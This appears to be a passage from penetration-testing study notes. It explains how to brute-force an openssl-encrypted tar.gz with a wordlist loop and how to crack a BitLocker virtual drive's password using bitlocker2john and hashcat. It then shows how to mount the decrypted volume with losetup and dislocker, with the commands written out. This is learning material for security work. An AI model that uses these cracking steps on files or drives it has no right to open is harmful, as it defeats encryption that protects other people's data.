      Not every protected file advertises it: a format that has no native password protection (a TAR or GZIP) may be wrapped with openssl instead. file tells you the truth, reporting "openssl enc'd data with salted password". There is no hash to extract, so crack it by brute force: a for loop that tries each wordlist entry as the key and only succeeds when the decrypt-and-extract works. The gzip and tar errors from wrong keys are safe to ignore; a new file in the directory means a hit.

      file GZIP.gzip
for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz 2>/dev/null; done
ls
    • BitLocker drives (bitlocker2john)

      BitLocker is Microsoft's full-disk encryption (AES-128 or AES-256), and virtual drives (.vhd) are sometimes used to lock personal files on company devices. bitlocker2john reads the volume and emits four hashes: the first two are the user password, the last two the 48-digit recovery key. The recovery key is random and not worth guessing, so crack the password hash, the one starting $bitlocker$0$. Hashcat mode 22100 handles it; AES makes it slow.

      bitlocker2john -i Private.vhd > bl.hashes
grep 'bitlocker$0' bl.hashes > bl.hash
hashcat -a 0 -m 22100 bl.hash /usr/share/wordlists/rockyou.txt
hashcat -m 22100 bl.hash --show
      • Mounting the cracked drive (loop devices)

        Cracking the password is only half of it; mounting the drive is where people get stuck, because a .vhd is a whole virtual disk, not a single volume. The BitLocker-encrypted filesystem lives in a partition inside the disk, so dislocker has to point at that partition, not the disk. losetup -f -P attaches the .vhd as a loop device (/dev/loop0) and -P exposes each partition as /dev/loop0p1, /dev/loop0p2 and so on. Guessing the partition fails loudly: /dev/loop0 (the whole disk) gives "Cannot parse volume header", and a partition that does not exist (/dev/loop0p2 here) gives "No such file or directory". So list the partitions with fdisk -lu /dev/loop0 and read off the NTFS one (here /dev/loop0p1). Point dislocker at it with the cracked password; it decrypts the partition to a virtual clear-text file named dislocker-file, which you then mount as an ordinary loop filesystem and browse. Unmount both mounts when you are done.

        sudo losetup -f -P Private.vhd
losetup -a
sudo fdisk -lu /dev/loop0
sudo dislocker /dev/loop0p1 -u<password> -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
ls -la /media/bitlockermount
sudo umount /media/bitlockermount /media/bitlocker
